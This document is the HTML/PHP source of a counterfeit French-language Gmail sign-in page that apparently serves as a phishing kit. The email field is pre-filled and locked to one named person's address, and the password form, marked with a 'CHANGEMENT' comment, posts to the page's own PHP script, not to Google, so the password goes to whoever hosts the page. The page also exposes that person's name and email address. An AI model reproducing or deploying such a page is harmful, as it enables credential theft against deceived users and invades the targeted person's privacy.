...
<head>
  ...
  <meta name="description" content="Gmail est un système de messagerie électronique intuitif, efficace et utile. Un espace de stockage de 15&nbsp;Go, moins de spam et un accès mobile.">
...
<h1>
  ...
  Connectez-vous pour accéder à Gmail.
  </h2>
</div>
<div id="rsi-card" class="card signin-card">
  <div id="cc_iframe_parent"><iframe src="https://accounts.youtube.com/accounts/CheckConnection?pmpo=https%3A%2F%2Faccounts.google.com&amp;v=1310203927&amp;timestamp=1485513874317" id="youtube" style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;"></iframe></div>
<img id="profile-img" class="profile-img" src="./assets/circle.png" alt="">
<p class="profile-name">Ophélie Demilly</p>
  <!-- CHANGEMENT -->
  <form novalidate="" method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>" id="gaia_loginform">
  <input name="Page" type="hidden" value="RememberedSignIn">
  <input type="hidden" name="GALX" value="g1kDoz20Qz8">
  <input type="hidden" name="gxf" value="AFoagUWVQWaEta-PPLhR-MaHeznywHfvVQ:1485513874114">
  ...
  <input type="hidden" id="checkConnection" name="checkConnection" value="youtube:225:1">
  <input type="hidden" id="checkedDomains" name="checkedDomains" value="youtube">
  <span id="reauthEmail" class="reauth-email">ophélie1234321@gmail.com</span>
<input id="Email" name="Email" type="email" class="email-input hidden" placeholder="Adresse e-mail" value="ophelie1234321@gmail.com" spellcheck="false" readonly="">
<label class="hidden-label" for="Passwd">Mot de passe</label>
<input id="Passwd" name="Passwd" type="password" placeholder="Mot de passe" class="">
  <input type="hidden" name="PersistentCookie" value="yes">
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Connexion">
  </form>
  <a id="link-forgot-passwd" href="https://accounts.google.com/signin/recovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail&amp;ss=1&amp;scc=1&amp;rm=false&amp;osid=1&amp;Email=carton.rudy%40gmail.com&amp;ignoreShadow=0&amp;hl=fr" class="need-help">
  Besoin d'aide&nbsp;?
  </a>
</div>
<div class="one-google">
  <p class="switch-account">
  <a id="account-chooser-link" href="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;hl=fr&amp;service=mail&amp;scc=1">
...
<div class="logo-strip"></div>
  ...
  <ul id="footer-list">
  <li>
  <a href="https://www.google.com/intl/fr/about" target="_blank">
  À propos de Google
  </a>
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=FR&amp;hl=fr&amp;privacy=true" target="_blank">
  Règles de confidentialité
  </a>
  </li>
  <li>
  <a href="https://accounts.google.com/TOS?loc=FR&amp;hl=fr" target="_blank">
